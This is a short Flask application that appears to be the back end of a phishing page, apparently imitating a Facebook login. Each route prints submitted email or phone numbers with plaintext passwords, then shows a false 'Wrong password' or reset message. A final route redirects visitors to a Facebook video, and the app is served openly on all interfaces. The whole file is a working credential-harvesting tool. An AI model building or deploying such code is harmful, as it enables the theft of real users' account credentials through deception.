from flask import Flask, request, render_template, redirect
import re

app = Flask(__name__, template_folder='../templates')

EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
PHONE_REGEX = re.compile(r'^\d{10}$')

@app.route('/')
def login_page():
    return render_template('login.html', error=None)

@app.route('/submit', methods=['POST'])
def submit():
    email_or_phone = request.form.get('email')
    password = request.form.get('password')
    print(f"Received: email_or_phone={email_or_phone}, password={password}")

    if not (EMAIL_REGEX.match(email_or_phone) or PHONE_REGEX.match(email_or_phone)):
        return render_template('login.html', error="Please enter a valid email or phone number.")
    
    return render_template('login.html', error="Wrong password. Please try again.")

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email_or_phone = request.form.get('email')
    password = request.form.get('password', '')
    print(f"Forgot password: email_or_phone={email_or_phone}, password={password}")

    if not (EMAIL_REGEX.match(email_or_phone) or PHONE_REGEX.match(email_or_phone)):
        return render_template('login.html', error="Please enter a valid email or phone number.")
    
    return render_template('login.html', error="Check your email for a password reset link.")

@app.route('/create-account', methods=['POST'])
def create_account():
    email_or_phone = request.form.get('email')
    password = request.form.get('password', '')
    print(f"Create account: email_or_phone={email_or_phone}, password={password}")

    if not (EMAIL_REGEX.match(email_or_phone) or PHONE_REGEX.match(email_or_phone)):
        return render_template('login.html', error="Please enter a valid email or phone number.")
    
    return render_template('login.html', error="Enter your details to sign up.")

@app.route('/redirect')
def redirect_to_facebook():
    return redirect('https://www.facebook.com/watch/?v=10153231379946729')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)